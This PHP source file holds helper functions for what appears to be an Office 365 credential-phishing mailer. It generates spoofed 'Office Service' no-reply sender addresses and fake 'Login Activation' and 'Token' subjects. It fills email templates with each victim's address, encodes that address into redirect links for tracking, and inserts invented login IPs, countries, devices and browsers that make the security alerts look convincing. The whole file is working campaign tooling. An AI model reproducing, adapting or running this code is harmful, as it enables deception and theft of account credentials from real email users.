<?php
function RandString($randstr)
{
    $char = 'QWERTYUIOPASDFGHJKLZXCVBNM123456789';
    $str = '';
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
};
function RandString1($randstr)
{
    $char = '123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $str = '';
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
};
function RandNumber($randstr)
{
    $char = '123456789';
    $str = '';
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
};
function randName($rand)
{
    switch ($rand)
    {
        case '1':
            $name = 'Office t';
        break;
        case '2':
            $name = 'Office Rmnd ';
        break;
        default:
            $name = '@Office.m';
        break;
    }
    return $name;
};
function randMail($rand)
{
    switch ($rand)
    {
        case '1':
            $name = "Office Service" . RandString1(10) . "no-reply" . RandString1(8) . "@servicemailjustification.com";
        break;
        case '2':
            $name = "Office Service" . RandString1(10) . "no-replly-" . RandString1(8) . "@servicemailjustification.com";
        break;
        default:
            $name = "Office Service" . RandString1(10) . "no-reeply-" . RandString1(8) . "@servicemailjustification.com";
        break;
    }
    return $name;
};
function randSubject($rand, $email)
{
    $r = rand(1000, 9999);
    switch ($rand)
    {
        case '1':
            $name = "Office 365 Login Activation #" . RandString(4) . "";
        break;
        case '2':
            $name = "Reminder : Office 365 Token #" . RandString(5) . "";
        break;
        default:
            $name = "u Office   n Ld F ut Rn #" . RandString(4) . "-" . RandString(4) . "";
        break;
    }
    return $name;
};

function secret_mail($email)
{
    $mail_parts = explode("@", $email);
    $length = strlen($mail_parts[0]);
    if ($length <= 0 & $length > 1)
    {
        $show = 1;
    }
    else
    {
        $show = floor($length / 4);
    }
    $hide = $length - $show;
    $replace = str_repeat("*", $hide);
    return substr_replace($mail_parts[0], $replace, $show, $hide) . "@" . substr_replace($mail_parts[1], "", 0, 0);
}

function lettering($msgfile, $email, $frommail, $fromname, $randurl, $subject, $redirect)
{
    $users = explode('@', $email);
    $user = $users[0];
    $domains = explode('@', $email);
    $domain = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = $domains1[0];
    $secret_mail = secret_mail($email);
    $randip = "" . rand(1, 100) . "." . rand(1, 100) . "." . rand(1, 100) . "." . rand(1, 100) . "";
    $randstr1 = RandString(10);
    $randstr1 = RandString(6);
    $randnumber2 = RandNumber(2);
    $randnumber4 = RandNumber(4);
    $randnumber6 = RandNumber(6);
    $randnumber8 = RandNumber(8);
    $randnumber10 = RandNumber(10);
    shuffle($randurl);
    $randurls = array_shift($randurl);
    $email64 = base64_encode($email);
    if ($redirect == 1)
    {
        $randurls = "$randurls/?email=" . urlencode($email64) . "";
    }
    else if ($redirect == 2)
    {
        $randurls = "$randurls?a=" . urlencode($email64) . "";
    }
    $randurls = encode($randurls);
    $countries = array(
        "Afghanistan",
        "Albania",
        "Algeria",
        "American Samoa",
        "Andorra",
        "Angola",
        "Anguilla",
        "Antarctica",
        "Antigua and Barbuda",
        "Argentina",
        "Armenia",
        "Aruba",
        "Australia",
        "Austria",
        "Azerbaijan",
        "Bahamas",
        "Bahrain",
        "Bangladesh",
        "Barbados",
        "Belarus",
        "Belgium",
        "Belize",
        "Benin",
        "Bermuda",
        "Bhutan",
        "Bolivia",
        "Bosnia and Herzegowina",
        "Botswana",
        "Bouvet Island",
        "Brazil",
        "British Indian Ocean Territory",
        "Brunei Darussalam",
        "Bulgaria",
        "Burkina Faso",
        "Burundi",
        "Cambodia",
        "Cameroon",
        "Canada",
        "Cape Verde",
        "Cayman Islands",
        "Central African Republic",
        "Chad",
        "Chile",
        "China",
        "Christmas Island",
        "Cocos (Keeling) Islands",
        "Colombia",
        "Comoros",
        "Congo",
        "Congo, the Democratic Republic of the",
        "Cook Islands",
        "Costa Rica",
        "Cote d'Ivoire",
        "Croatia (Hrvatska)",
        "Cuba",
        "Cyprus",
        "Czech Republic",
        "Denmark",
        "Djibouti",
        "Dominica",
        "Dominican Republic",
        "East Timor",
        "Ecuador",
        "Egypt",
        "El Salvador",
        "Equatorial Guinea",
        "Eritrea",
        "Estonia",
        "Ethiopia",
        "Falkland Islands (Malvinas)",
        "Faroe Islands",
        "Fiji",
        "Finland",
        "France",
        "France Metropolitan",
        "French Guiana",
        "French Polynesia",
        "French Southern Territories",
        "Gabon",
        "Gambia",
        "Georgia",
        "Germany",
        "Ghana",
        "Gibraltar",
        "Greece",
        "Greenland",
        "Grenada",
        "Guadeloupe",
        "Guam",
        "Guatemala",
        "Guinea",
        "Guinea-Bissau",
        "Guyana",
        "Haiti",
        "Heard and Mc Donald Islands",
        "Holy See (Vatican City State)",
        "Honduras",
        "Hong Kong",
        "Hungary",
        "Iceland",
        "India",
        "Indonesia",
        "Iran (Islamic Republic of)",
        "Iraq",
        "Ireland",
        "Israel",
        "Italy",
        "Jamaica",
        "Japan",
        "Jordan",
        "Kazakhstan",
        "Kenya",
        "Kiribati",
        "Korea, Democratic People's Republic of",
        "Korea, Republic of",
        "Kuwait",
        "Kyrgyzstan",
        "Lao, People's Democratic Republic",
        "Latvia",
        "Lebanon",
        "Lesotho",
        "Liberia",
        "Libyan Arab Jamahiriya",
        "Liechtenstein",
        "Lithuania",
        "Luxembourg",
        "Macau",
        "Macedonia, The Former Yugoslav Republic of",
        "Madagascar",
        "Malawi",
        "Malaysia",
        "Maldives",
        "Mali",
        "Malta",
        "Marshall Islands",
        "Martinique",
        "Mauritania",
        "Mauritius",
        "Mayotte",
        "Mexico",
        "Micronesia, Federated States of",
        "Moldova, Republic of",
        "Monaco",
        "Mongolia",
        "Montserrat",
        "Morocco",
        "Mozambique",
        "Myanmar",
        "Namibia",
        "Nauru",
        "Nepal",
        "Netherlands",
        "Netherlands Antilles",
        "New Caledonia",
        "New Zealand",
        "Nicaragua",
        "Niger",
        "Nigeria",
        "Niue",
        "Norfolk Island",
        "Northern Mariana Islands",
        "Norway",
        "Oman",
        "Pakistan",
        "Palau",
        "Panama",
        "Papua New Guinea",
        "Paraguay",
        "Peru",
        "Philippines",
        "Pitcairn",
        "Poland",
        "Portugal",
        "Puerto Rico",
        "Qatar",
        "Reunion",
        "Romania",
        "Russian Federation",
        "Rwanda",
        "Saint Kitts and Nevis",
        "Saint Lucia",
        "Saint Vincent and the Grenadines",
        "Samoa",
        "San Marino",
        "Sao Tome and Principe",
        "Saudi Arabia",
        "Senegal",
        "Seychelles",
        "Sierra Leone",
        "Singapore",
        "Slovakia (Slovak Republic)",
        "Slovenia",
        "Solomon Islands",
        "Somalia",
        "South Africa",
        "South Georgia and the South Sandwich Islands",
        "Spain",
        "Sri Lanka",
        "St. Helena",
        "St. Pierre and Miquelon",
        "Sudan",
        "Suriname",
        "Svalbard and Jan Mayen Islands",
        "Swaziland",
        "Sweden",
        "Switzerland",
        "Syrian Arab Republic",
        "Taiwan, Province of China",
        "Tajikistan",
        "Tanzania, United Republic of",
        "Thailand",
        "Togo",
        "Tokelau",
        "Tonga",
        "Trinidad and Tobago",
        "Tunisia",
        "Turkey",
        "Turkmenistan",
        "Turks and Caicos Islands",
        "Tuvalu",
        "Uganda",
        "Ukraine",
        "United Arab Emirates",
        "United Kingdom",
        "United States",
        "United States Minor Outlying Islands",
        "Uruguay",
        "Uzbekistan",
        "Vanuatu",
        "Venezuela",
        "Vietnam",
        "Virgin Islands (British)",
        "Virgin Islands (U.S.)",
        "Wallis and Futuna Islands",
        "Western Sahara",
        "Yemen",
        "Yugoslavia",
        "Zambia",
        "Zimbabwe"
    );
    shuffle($countries);
    $country = array_shift($countries);
    $OSystems = array(
        'Windows 10',
        'Windows 8.1',
        'Windows 8',
        'Windows 7',
        'Windows Vista',
        'Windows Server 2003/XP x64',
        'Windows XP',
        'Windows XP',
        'Mac OS X',
        'Mac OS 9',
        'Linux',
        'Ubuntu',
        'iPhone',
        'iPod',
        'iPad',
        'Android',
        'BlackBerry',
        'Windows 10 Home Edition'
    );
    shuffle($OSystems);
    $OS = array_shift($OSystems);
    $ListBrowser = array(
        'Internet Explorer',
        'Firefox',
        'Safari',
        'Chrome',
        'Edge',
        'Opera',
        'Netscape',
        'Tor Browser'
    );
    shuffle($ListBrowser);
    $browser = array_shift($ListBrowser);
    $date = date('d/M/Y');
    $time = date('g:i A (T)');
    $file = file_get_contents($msgfile);
    $arr = array(
        '<[mxlng_email64]>',
        '<[mxlng_email]>',
        '<[mxlng_subject]>',
        '<[mxlng_randomip]>',
        '<[mxlng_frommail]>',
        '<[mxlng_fromname]>',
        '<[mxlng_short]>',
        '<[mxlng_randstring]>',
        '<[mxlng_country]>',
        '<[mxlng_date]>',
        '<[mxlng_number2]>',
        '<[mxlng_number4]>',
        '<[mxlng_number6]>',
        '<[mxlng_number8]>',
        '<[mxlng_number10]>',
        '<[mxlng_os]>',
        '<[mxlng_browser]>',
        '<[mxlng_time]>',
        '<[mxlng_user]>',
        '<[mxlng_domain]>',
        '<[mxlng_domain1]>',
        '<[mxlng_secret_email]>'
    );
    $new = array(
        '' . $email64 . '',
        '' . $email . '',
        '' . $subject . '',
        '' . $randip . '',
        '' . $frommail . '',
        '' . $fromname . '',
        '' . $randurls . '',
        '' . $randstr1 . '',
        '' . $country . '',
        '' . $date . '',
        '' . $randnumber2 . '',
        '' . $randnumber4 . '',
        '' . $randnumber6 . '',
        '' . $randnumber8 . '',
        '' . $randnumber10 . '',
        '' . $OS . '',
        '' . $browser . '',
        '' . $time . '',
        '' . $user . '',
        '' . $domain . '',
        '' . $domain1 . '',
        '' . $secret_mail . ''
    );
    $repl = str_replace($arr, $new, $file);
    return $repl;
};
function subjecting($msgfile, $email, $frommail, $fromname, $randurl, $subject, $redirect)
{
    $users = explode('@', $email);
    $user = $users[0];
    $domains = explode('@', $email);
    $domain = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = $domains1[0];
    $secret_mail = secret_mail($email);
    $randstr1 = RandString(10);
    $randstr1 = RandString(6);
    $randnumber2 = RandNumber(2);
    $randnumber4 = RandNumber(4);
    $randnumber6 = RandNumber(6);
    $randnumber8 = RandNumber(8);
    $randnumber10 = RandNumber(10);
    shuffle($randurl);

    $randurls = array_shift($randurl);
    $email64 = base64_encode($email);
    if ($redirect == 1)
    {
        $randurls = "$randurls/?email=" . urlencode($email64) . "";
    }
    else if ($redirect == 2)
    {
        $randurls = "$randurls?a=" . urlencode($email64) . "";
    }
    $randurls = encode($randurls);
    $date = date('d/M/Y');
    $time = date('g:i A (T)');
    $file = $msgfile;
    $arr = array(
        '<[mxlng_email64]>',
        '<[mxlng_email]>',
        '<[mxlng_subject]>',
        '<[mxlng_frommail]>',
        '<[mxlng_fromname]>',
        '<[mxlng_short]>',
        '<[mxlng_randstring]>',
        '<[mxlng_date]>',
        '<[mxlng_number2]>',
        '<[mxlng_number4]>',
        '<[mxlng_number6]>',
        '<[mxlng_number8]>',
        '<[mxlng_number10]>',
        '<[mxlng_time]>',
        '<[mxlng_user]>',
        '<[mxlng_domain]>',
        '<[mxlng_domain1]>',
        '<[mxlng_secret_email]>'
    );
    $new = array(
        '' . $email64 . '',
        '' . $email . '',
        '' . $subject . '',
        '' . $frommail . '',
        '' . $fromname . '',
        '' . $randurls . '',
        '' . $randstr1 . '',
        '' . $date . '',
        '' . $randnumber2 . '',
        '' . $randnumber4 . '',
        '' . $randnumber6 . '',
        '' . $randnumber8 . '',
        '' . $randnumber10 . '',
        '' . $time . '',
        '' . $user . '',
        '' . $domain . '',
        '' . $domain1 . '',
        '' . $secret_mail . ''
    );
    $repl = str_replace($arr, $new, $file);
    return $repl;
};
function Reletter($letter, $mailto)
{
    $file = file_get_contents($letter);
    $arr = array(
        '<[mxlng_email]>'
    );
    $new = array(
        '' . $mailto . ''
    );
    $repl = str_replace($arr, $new, $file);
    return $repl;
};
function berhenti($kata)
{
    $k = strlen($kata);
    if ($k == $k)
    {
        $p = substr($kata, $k - 1);
        if ($p == 0)
        {
            echo "Break for 5 seconds...
";
            sleep(5);
        }
    }
}
function Savedata($file, $data)
{
    $file = fopen($file, "w");
    fputs($file, PHP_EOL . $data);
    return fclose($file);
};
function RemoveLine($file, $name)
{
    $getfile = file_get_contents($file);
    $search = explode($name, $getfile);
    $save = $search[1];
    $savedata = Savedata($file, $save);
    return $savedata;
};

